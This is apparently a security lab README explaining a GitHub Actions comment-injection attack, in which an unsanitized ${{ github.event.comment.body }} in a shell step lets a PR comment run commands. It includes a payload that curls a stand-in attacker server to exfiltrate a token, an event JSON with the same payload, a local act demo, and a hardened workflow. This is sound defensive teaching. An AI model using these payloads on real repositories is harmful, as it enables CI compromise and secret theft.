# 🔐 Sandbox 3 - Branch Name Injection (microsoft/ai-discovery-agent)

## 📋 Overview

| Property | Value |
|----------|-------|
| **Attack Type** | Branch name injection via unsanitized `${{ }}` expression |
| **Real Target** | microsoft/ai-discovery-agent |
| **Attacker** | hackerbot-claw (Feb 27, 2026) |
| **Trigger** | `issue_comment` on Pull Request - not `push` |
| **Result** | ❌ RCE via bash command substitution in comment body |
| **Fixed** | ✅ Attack blocked by storing expression in `env` variable |

> 💡 **Note:** This attack exploits the `issue_comment` trigger on a PR.
> The attacker does **not** need to push code or get PR approval -
> **a simple comment is enough** to achieve Remote Code Execution.

---

## 📁 Structure
```
sandbox-3-branch-injection/
│
├── vulnerable/                          ← ATTACKED VERSION
│   └── .github/
│       └── workflows/
│           └── format-request.yml      ← vulnerable workflow
│
├── fixed/                               ← SECURED VERSION
│   └── .github/
│       └── workflows/
│           └── format-request.yml      ← hardened workflow
│
└── attacker/
    └── PAYLOAD_EXPLANATION.md          ← malicious comment body explained
```

---

## 🔄 Attack Flow

### Visual Diagram
```
┌──────────────────────────────────────────────────────────┐
│                      ATTACK FLOW                          │
├──────────────────────────────────────────────────────────┤
│                                                           │
│   1. Attacker posts malicious PR comment:                 │
│      /format dev$(curl http://localhost:8888/exfil)       │
│      ⚠️  ANY user can post a comment - no permission      │
│                    ↓                                      │
│   2. issue_comment trigger fires                          │
│      (comment on PR - NOT a push event)                   │
│                    ↓                                      │
│   3. Workflow does:                                       │
│      echo "${{ github.event.comment.body }}"              │
│      ⚠️  raw comment injected directly into bash          │
│                    ↓                                      │
│   4. bash evaluates $( ) - curl executes                  │
│                    ↓                                      │
│   5. curl POST → data → attacker server                   │
│                    ↓                                      │
│   ❌ RCE via bash command substitution                    │
│                                                           │
├──────────────────────────────────────────────────────────┤
│                       THE FIX                             │
├──────────────────────────────────────────────────────────┤
│                                                           │
│   env:                                                    │
│     BRANCH_NAME: ${{ github.event.comment.body }}         │
│   echo "$BRANCH_NAME"                                     │
│   ✅ bash NEVER evaluates env variables as commands       │
│                    ↓                                      │
│   ✅ Attack blocked                                       │
│                                                           │
└──────────────────────────────────────────────────────────┘
```

### Simplified Diagram
```
PR Comment (/format dev$(curl ...))
           ↓
issue_comment trigger (no author check ⚠️)
           ↓
echo "${{ github.event.comment.body }}"
           ↓                    ↑
bash sees $(...) ──── EXECUTES IT
           ↓
curl → localhost:8888/exfil
           ↓
❌ Data exfiltrated
```

---

## ⚠️ Vulnerability Conditions

Two conditions must be met simultaneously:
```yaml
# ⚠️ Condition 1: no author_association check
# CRITICAL: ANY GitHub user can trigger this
# by posting a /format comment on any PR
jobs:
  save-format-request:
    if: contains(github.event.comment.body, '/format')
    # ← MISSING: author_association check

# ⚠️ Condition 2: ${{ }} interpolated DIRECTLY in shell
steps:
  - name: Save format request data
    run: |
      # DANGER: ${{ github.event.comment.body }} injects
      # raw attacker input directly into bash
      # if it contains $(...), bash WILL execute it
      echo "${{ github.event.comment.body }}" > ./pr_head_ref
      #     ↑
      #  CRITICAL VULNERABILITY HERE
```

---

## 💣 Malicious Payload

The attacker posts a comment with embedded **bash command substitution**:
```bash
# Malicious comment body:
/format dev$(curl -s -X POST -d "token=EXFILTRATED_TOKEN" http://attacker-server/exfil)
#            ↑
#   $(...) - bash will execute this as a command

# What bash evaluates in the workflow:
echo "/format dev$(curl -s -X POST -d "token=EXFILTRATED_TOKEN" http://attacker-server/exfil)"
#                  ↑
#   CRITICAL: bash executes curl here - token exfiltrated silently
```

> 💡 **Why is this effective?**
> `${{ github.event.comment.body }}` injects the **raw comment** into bash.
> Bash sees `$(...)` and executes it as a **command substitution**.
> The real attack showed a **2 minute 38 second gap** in the build log -
> consistent with the payload executing a remote script silently.

> 🔑 **No code modification needed.**
> The attacker just posts a comment. That's it.

---

## 🔒 Why `env` Blocks the Attack

> 💡 **This is the key security concept of this sandbox:**
```
VULNERABLE - bash evaluates the expression:
─────────────────────────────────────────────
run: |
  echo "${{ github.event.comment.body }}"
       ↑
  bash receives: echo "/format dev$(curl http://attacker/exfil)"
  bash sees $(...) → EXECUTES curl → ❌ RCE


SAFE - bash treats the value as plain text:
─────────────────────────────────────────────
env:
  BRANCH_NAME: ${{ github.event.comment.body }}
run: |
  echo "$BRANCH_NAME"
       ↑
  bash receives: echo "$BRANCH_NAME"
  bash expands the variable → prints its VALUE as text
  bash NEVER evaluates $(...)  inside a variable value → ✅ Safe
```

> 🔑 **The rule:** When you use `env:` to pass a `${{ }}` expression,
> GitHub Actions evaluates the expression **before** bash sees it.
> Bash then receives a plain string - it cannot execute `$(...)` inside it.
> **Environment variable values are NEVER interpreted as shell commands.**

---

## 📄 Event JSON

> 💡 **What is the Event JSON?**
> When running locally with `act`, we simulate a GitHub event using a JSON file.
> The `event_branch_injection.json` mimics a **PR comment** from an
> **untrusted external user** (`author_association: NONE`) posting a malicious
> `/format` comment with embedded bash command substitution.
```json
{
  "action": "created",
  "issue": {
    "number": 1,
    "pull_request": {
      "url": "https://api.github.com/repos/owner/repo/pulls/1"
    }
  },
  "comment": {
    "body": "/format dev$(curl -s -X POST -d token=EXFILTRATED_TOKEN http://host.docker.internal:8888/exfil)",
    "author_association": "NONE"
  },
  "repository": {
    "full_name": "owner/repo"
  }
}
```

---

## 🧪 Local Demonstration

> ⚠️ **Safety Disclaimer:**
> This demonstration runs **entirely locally** using `act` and Docker.
> `localhost:8888` is a **simulated exfiltration server** on your own machine.
> **No real data is sent anywhere outside your machine.**
> Never run these attacks against real repositories without explicit authorization.

### Step 1 - Start exfiltration server
```bash
# Terminal 2 - keep this running
python exfil_server.py

# Expected output:
# Exfiltration server running on port 8888...
```

### Step 2 ❌ - Run Vulnerable Version
```bash
# Terminal 1
act issue_comment \
    --eventpath event_branch_injection.json \
    --secret-file .secrets \
    -W sandbox-3-branch-injection/vulnerable/.github/workflows/format-request.yml \
    -P ubuntu-latest=catthehacker/ubuntu:act-latest \
    -s GITHUB_TOKEN=$token
```

**Terminal 1 - victim sees nothing suspicious:**
```
✅ Success - Main Save format request data
🏁 Job succeeded
```

**Terminal 2 - attacker receives the data:**
```
==================================================
TOKEN EXFILTRATED!
Data: token=EXFILTRATED_TOKEN
==================================================
❌ Attack succeeded - bash command substitution executed
```

### Step 3 ✅ - Run Fixed Version
```bash
act issue_comment \
    --eventpath event_branch_injection.json \
    --secret-file .secrets \
    -W sandbox-3-branch-injection/fixed/.github/workflows/format-request.yml \
    -P ubuntu-latest=catthehacker/ubuntu:act-latest \
    -s GITHUB_TOKEN=$token -v
```

**Terminal 1 - job blocked immediately:**
```
expression evaluated to 'false'
Skipping job 'save-format-request'
author_association == NONE - not MEMBER or OWNER
✅ Job skipped - attacker blocked
```

**Terminal 2:**
```
(no request received)
✅ Attack blocked - nothing exfiltrated
```

---

## 🛠️ Applied Fix

| Element | ❌ Vulnerable | ✅ Fixed |
|---------|-------------|---------|
| Trigger | Any user via comment | `MEMBER`/`OWNER` only |
| `author_association` | Not checked | Verified |
| `${{ }}` expression | Directly in shell | Stored in `env` variable |
| Bash evaluation | `$(...)` executed | Treated as plain text |
```yaml
# ✅ FIXED WORKFLOW
jobs:
  save-format-request:
    if: |
      contains(github.event.comment.body, '/format') &&
      (github.event.comment.author_association == 'MEMBER' ||
       github.event.comment.author_association == 'OWNER')
      # ✅ CRITICAL: only trusted users can trigger

    permissions:
      contents: read

    steps:
      - name: Save format request data
        env:
          # ✅ store ${{ }} in env variable first
          # GitHub evaluates it BEFORE bash sees it
          BRANCH_NAME: ${{ github.event.comment.body }}
        run: |
          # ✅ $BRANCH_NAME is plain text
          # bash NEVER executes $(...) inside variable values
          echo "$BRANCH_NAME" > ./format-request/pr_head_ref
```

---

## 🔑 Key Lesson

> ⚠️ **Never interpolate `${{ }}` expressions directly inside shell commands.**
>
> `${{ github.event.comment.body }}` injects **raw attacker-controlled input**
> directly into bash. Any `$(...)` in that input will be **executed**.
>
> ✅ **Rule:** Always store `${{ }}` in `env` variables first.
> Bash **never evaluates** `$(...)` inside environment variable values.
>
> 🔑 **Remember:** A PR comment is **untrusted user input**.
> Treat it like a web form input - **sanitize before use**.

---

## 🔗 References

- [Real attack analysis - StepSecurity](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation)
- [GitHub Actions expression injection](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)
- [act - Local GitHub Actions runner](https://github.com/nektos/act)
